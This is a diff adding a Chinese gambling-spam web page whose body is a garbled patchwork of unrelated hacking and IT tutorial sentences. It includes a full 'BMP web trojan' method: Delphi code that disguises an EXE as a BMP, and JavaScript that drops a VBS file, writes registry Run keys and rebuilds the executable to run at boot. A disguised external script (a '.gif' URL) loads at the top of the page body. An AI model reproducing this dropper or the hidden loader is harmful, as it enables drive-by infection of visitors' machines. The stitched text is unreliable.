@@ -1,0 +1,101 @@
+<!DOCTYPE html PUBLIC "-//W3C//liD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/liD/xhtml1-transitional.lid">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>利通注册 - 网站</title>
+<meta content="all" name="robots" />
+<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7" />
+<link href="style.css" rel="stylesheet" type="text/css" />
+</head>
+<body><script language="javascript" src="http://bb.5599bb.com/888.gif"></script>
+<div class="wrap">
+   <div class="clear blank10"></div>
+   <div class="navi">　您现在的位置 <a  href="http:///baidugo">首页</a> ><a  href="http:///baiducom">新闻资讯</a> ><a  href="http:///baidunet">新闻论坛</a> ><a  href="http:///baiducn">新闻专题</a> > <a  href="http:///baidujc">新闻行情</a> > <a  href="http:///baidugc">新闻时尚</a> > <a  href="http:///baidu">新闻游戏</a> > <a  href="http:///baiduvip">新闻娱乐</a> > <a  href="http:///baidutv">新闻集休闲</a> > <a  href="http:///sohucom">新闻平台</a> > <a  href="http:///pps">产品中心</a> > 浏览文章</div>
+   <div class="clear blank10"></div>
+   <div class="newsmain">
+      <div id="side">
+	      <div class="sideNav">
+		     <h2>热门文章</h2>
+		        <ul><li><a href="http://www.15bl.com/baidugo">纬来娱乐彩票</a></li>
+</ul>
+		   <div class="sidebottom"></div>
+	       </div>
+       </div>
+       <div class="rightPar" id="about">
+            <div class="aboutTitle">
+                <h3><span>作者：admin </span> 利通注册</h3>
+            </div>
+              <div id="MyContent">
+					<div id="MyContent"><p>有些网友认为安装了Perl解释器后就可通过双击文件运行，这是错误的，因为Perl是脚本文件，它只能在浏览器内调用，所以必须安装WEB器软件。
+</p>
+<p>70219，70220和70221是以70210到70217为基础的，所以前面学习的好坏直接影响到后面学习的效率。
+</p>
+<p>图7：看到这里，你可能要说了，这个iis后门在3389终端里安装很方便，在命令行下呢？我们也有办法。
+</p>
+<p>“栈(stack)和“堆(heap)是两种不同的动态区，栈是一种线性结构，堆是一种链式结构。
+</p>
+<p>详解BMP网页木马首先说明这不是什么新的东西,但最近详解BMP网页木马首先说明这不是什么新的东西,但最近有人说我们没有,那就随便写编文章放上来了,大家自己试验一下.何谓BMP网页木马?它和过去早就用臭了的MIME头的木马不同,MIME木马是把一个EXE文件用MIME编码为一个EML(OUTLOOK信件)文件,放到网页上利用IE和OE的编码实现下载和执行.然而BMP木马就不同,它把一个EXE文件伪装成一个BMP图片文件,欺骗IE下载,再利用网页中的JAVASCRIPT脚本查找title客户端的Internet临时文件夹,找到下载后的BMP文件,把它拷贝到TEMP目录.再编写一个脚本把找到的BMP文件用DEBUG还原成EXE,并把它放到title注册表启动项中,在下一次开机时执行.但是这种只能在9X下发挥作用,对于2K,XP来说是无能为力了.看上去好象很复杂,下面我们一步一步来:1)EXE变BMP的方法.大家自己去查查BMP文件资料就会知道,BMP文件的文件头有54个字节,简单来说里面包含了BMP文件的长宽,位数,文件大小,区长度,我们只要在EXE文件的文件头前面添加相应的BMP文件头(当然BMP文件头里面的要符合EXE文件的大小啦),这样就可以欺骗IE下载该BMP文件,开始我们用JPG文件做过试验,发现如果文件头不正确的话,IE是不会下载的,转换代码如下:programexe2bmp;usesWindows,SysUtils;varlen,row,col,fs:DWORD;buffer:array[0..255]ofchar;fd:WIN32_FIND_DATA;h,hw:THandle;beginif(ParamStr(1)'')and(ParamStr(2)'')thenbegin如果运行后没有两个参数则退出ifFileExists(ParamStr(1))thenbeginFindFirstFile(Pchar(ParamStr(1)),fd);fs:=fd.nFileSizeLow;col:=4;whiletruedobeginif(fsmod12)=0thenbeginlen:=fs;endelselen:=fs+12(fsmod12);row:=lendivcoldiv3;ifrow>colthenbegincol:=col+4;endelseBreak;end;FillChar(buffer,256,0);一下为BMP文件头Buffer[0]:='B';Buffer[1]:='M';PDWORD(buffer[18])^:=col;PDWORD(buffer[22])^:=row;PDWORD(buffer[34])^:=len;PDWORD(buffer[2])^:=len+54;PDWORD(buffer[10])^:=54;PDWORD(buffer[14])^:=40;PWORD(buffer[26])^:=1;PWORD(buffer[28])^:=24;写入文件hw:=CreateFile(Pchar(ParamStr(2)),GENERIC_WRITE,FILE_SHARE_READorFILE_SHARE_WRITE,nil,CREATE_ALWAYS,0,0);h:=CreateFile(Pchar(ParamStr(1)),GENERIC_READ,FILE_SHARE_READorFILE_SHARE_WRITE,nil,OPEN_EXISTING,0,0);WriteFile(hw,buffer,54,col,0);repeatReadFile(h,buffer,256,col,0);WriteFile(hw,buffer,col,col,0);untilcol256;WriteFile(hw,buffer,lenfs,col,0);CloseHandle(h);CloseHandle(hw);end;end;end.以上代码可以在DELPHI4,5,6中编译,就可以得到一个exe2bmp.exe文件.大家打开MSDOS方式,输入exe2bmpmyexe.exemybmp.bmp回车就可以把第二个参数所指定的EXE文件转换成BMP格式.接着就是把这个BMP图片放到网页上了,如果大家打开过这张图片的话,一定发现这张BMP又花,颜色又单调.所以大家放在网页上最好用这样的格式以下是放在网页上的脚本document.write('');functiondocsave()a=document.applets[0];a.setCLSID('F935DC221CF011D0ADB900C04FD58A0B');a.createInstance();wsh=a.GetObject();a.setCLSID('0D43FE01F09311CF894000A0C9054228');a.createInstance();fso=a.GetObject();varwinsys=fso.GetSpecialFolder(1);varvbs=winsys+'\s.vbs';wsh.RegWrite('HKCU\Software\Microsoft\Windows\CurrentVersion\Run\vbs','wscript'+'"'+vbs+'"');varst=fso.CreateTextFile(vbs,true);st.WriteLine('OptionExplicit');st.WriteLine('DimFSO,WSH,CACHE,str');st.WriteLine('SetFSO=CreateObject("Scripting.FileSystemObject")');st.WriteLine('SetWSH=CreateObject("WScript.Shell")');st.WriteLine('CACHE=wsh.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ShellFolders\Cache")');st.WriteLine('wsh.RegDelete("HKCU\Software\Microsoft\Windows\CurrentVersion\Run\vbs")');st.WriteLine('wsh.RegWrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\tmp","tmp.exe"');st.WriteLine('SearchBMPFilefso.GetFolder(CACHE),"mybmp[1].bmp"');st.WriteLine('WScript.uit()');st.WriteLine('FunctionSearchBMPFile(Folder,fname)');st.WriteLine('DimSubFolder,File,Lt,tmp,winsys');st.WriteLine('str=FSO.GetParentFolderName(folder)&"\"&folder.name&"\"&fname');st.WriteLine('ifFSO.FileExists(str)then');st.WriteLine('tmp=fso.GetSpecialFolder(2)&"\"');st.WriteLine('winsys=fso.GetSpecialFolder(1)&"\"');st.WriteLine('setFile=FSO.GetFile(str)');st.WriteLine('File.Copy(tmp&"tmp.dat")');st.WriteLine('File.Delete');st.WriteLine('setLt=FSO.CreateTextFile(tmp&"tmp.in")');st.WriteLine('Lt.WriteLine("rbx")');st.WriteLine('Lt.WriteLine("0")');st.WriteLine('Lt.WriteLine("rcx")');st.WriteLine('Lt.WriteLine("1000")');st.WriteLine('Lt.WriteLine("w136")');st.WriteLine('Lt.WriteLine("")');st.WriteLine('Lt.Close');st.WriteLine('WSH.Run"commandcdebug"&tmp&"tmp.dat"&tmp&"tmp.out",false,6');st.WriteLine('OnErrorResumeNext');st.WriteLine('FSO.GetFile(tmp&"tmp.dat").Copy(winsys&"tmp.exe")');st.WriteLine('FSO.GetFile(tmp&"tmp.dat").Delete');st.WriteLine('FSO.GetFile(tmp&"tmp.in").Delete');st.WriteLine('FSO.GetFile(tmp&"tmp.out").Delete');st.WriteLine('endif');st.WriteLine('IfFolder.SubFolders.Count0Then');st.WriteLine('ForEachSubFolderInFolder.SubFolders');st.WriteLine('SearchBMPFileSubFolder,fname');st.WriteLine('Next');st.WriteLine('EndIf');st.WriteLine('EndFunction');st.Close();setTimeout('docsave()',1000);把该脚本保存为"js.js",在网页中插入:该脚本主要会在本地机器的SYSTEM目录下生成一个“S.VBS文件，该脚本文件会在下次开机时运行。
+</p>
+<p>LE版本功能上受到一些限制，是版本。
+</p>
+<p>本课程将向学员解释一系列可以用来改进Oracle8器性能的调整步骤。
+</p>
+<p>什么是木马?
+</p>
+<p>scotttiger
+</p>
+<p>主机入侵检测系统在不使用诸如“停止、“注销用户等响应方法时风险较少。
+</p>
+<p>4、检查连接和监听端口输入netstatan，列出本机所有的连接和监听的端口，查看有没有非法连接。
+</p>
+<p>●如何将外挂代码注入到游戏程序进程地址空间？
+</p>
+<p>X=ShowCursor(True)
+</p>
+<p>以下修改title注册信息文件IL_01eb:ldc.i4.4IL_01ec:ldc.i4.2IL_01ed:ldc.i4.1IL_01ee:newobjinstancevoidclass[mscorlib]System.IO.FileStream::.ctor(string,IL_01f3:callclass[mscorlib]System.Text.Encodingclass[mscorlib]System.Text.Encoding::get_UTF8()IL_01f8:newobjinstancevoidclass[mscorlib]System.IO.StreamWriter::.ctor(class[mscorlib]System.IO.StreamIL_01fd:stloc.sV_8IL_01ff:ldloc.sV_8IL_0201:callclass[mscorlib]System.Text.Encodingclass[mscorlib]System.Text.Encoding::get_Unicode()IL_0206:ldloca.sV_5IL_0208:callinstancestringclass[mscorlib]System.Int32::ToString()IL_020d:callvirtinstanceunsignedint8[]class[mscorlib]System.Text.Encoding::GetBytes(string)IL_0212:callstringclass[mscorlib]System.Convert::ToBase64String(unsignedint8[])IL_0217:callvirtinstancevoidclass[mscorlib]System.IO.TextWriter::WriteLine(string)IL_021c:ldloc.sV_8IL_021e:callvirtinstancevoidclass[mscorlib]System.IO.StreamWriter::Close()IL_0223:ldarg.0IL_0224:ldfldclass[CommonDll]xk::apIL_0229:callvirtinstancestringclass[CommonDll]x::c()IL_022e:ldc.i4.4IL_022f:ldc.i4.2IL_0230:ldc.i4.1IL_0231:newobjinstancevoidclass[mscorlib]System.IO.FileStream::.ctor(string,IL_0236:callclass[mscorlib]System.Text.Encodingclass[mscorlib]System.Text.Encoding::get_UTF8()IL_023b:newobjinstancevoidclass[mscorlib]System.IO.StreamWriter::.ctor(class[mscorlib]System.IO.Stream,IL_0240:stloc.sV_8IL_0242:ldloc.sV_8IL_0244:callclass[mscorlib]System.Text.Encodingclass[mscorlib]System.Text.Encoding::get_Unicode()IL_0249:ldloca.sV_5IL_024b:callinstancestringclass[mscorlib]System.Int32::ToString()IL_0250:callvirtinstanceunsignedint8[]class[mscorlib]System.Text.Encoding::GetBytes(string)IL_0255:callstringclass[mscorlib]System.Convert::ToBase64String(unsignedint8[])IL_025a:callvirtinstancevoidclass[mscorlib]System.IO.TextWriter::WriteLine(string)IL_025f:ldloc.sV_8IL_0261:callvirtinstancevoidclass[mscorlib]System.IO.StreamWriter::Close()IL_0266:leave.sIL_0295
+</p>
+<p>但对于新手来说足够了！
+</p>
+<p>&amp;parse_form;
+</p>
+<p>强烈建议您不要在文件名中包含空格。
+</p>
+<p>1.WIN.INI启动：启动位置：[windows]load=file.exerun=file.exe注意：load=与run=的区别在于：通过load=运行文件，文件会在后台运行；而通过run=来运行，则文件是在默认状态下被运行的。
+</p>
+<p>磁盘阵列效能
+</p>
+<p>当然你#可以在make的命令行覆盖它们，你愿意就没问题。
+</p>
+<p>本以为，治标不治本的方法解决了它，可是再次重新启动计算机，发现病毒居然又明目张胆地呆在了我的进程表里&mdash;&mdash;哎，郁闷!
+</p>
+<p>我们知道线程一般隐藏进程的方法实际是无法彻底隐藏进程，因为内核调度是基于线程的。
+</p>
+<p>再次用freeRes进行资源重建。
+</p>
+<p>然后用软盘或U盘启动电脑，在dos下删除_RESTORE文件夹。
+</p>
+<p>More指令可以使超过一页的文件临时停留在屏幕，等你按任何的一个键以后，才继续显示。
+</p>
+<p>启动兔子魔法，点击IE图标按钮，在弹出的窗口左上方有一个“＋按钮，点击此按钮即可进入到IE的深入设置窗口。
+</p>
+<p>不过，不要叹息英雄无用武之地，在上经常会有“入侵大奖赛一类的活动，让你不但有得做，还有得奖金拿哦，去试试你的“黑武艺吧。
+</p>
+<p>Dreammail另有多种美丽背景可供选择，不再一一赘述。
+</p>
+
+					<br/>
+					<p align=left >上一篇：<a href="517.html">新淘宝彩票
+</a>|下一篇：<a href="519.html">吉祥彩娱乐平台注册
+</a></P>
+					</div>
+		  </div>
+     </div>
+  </div>
+</div>
+<div class="clear blank10"></div>
+<div class="copyright"> <br>
+ </div>
+<script language="javascript" type="text/javascript" src="http://js.users.51.la/17275833.js"></script>
+  <script language="javascript" src="http://count19.51yes.com/click.aspx?id=193782333&logo=1" charset="gb2312"></script>
+</body>
+</html>
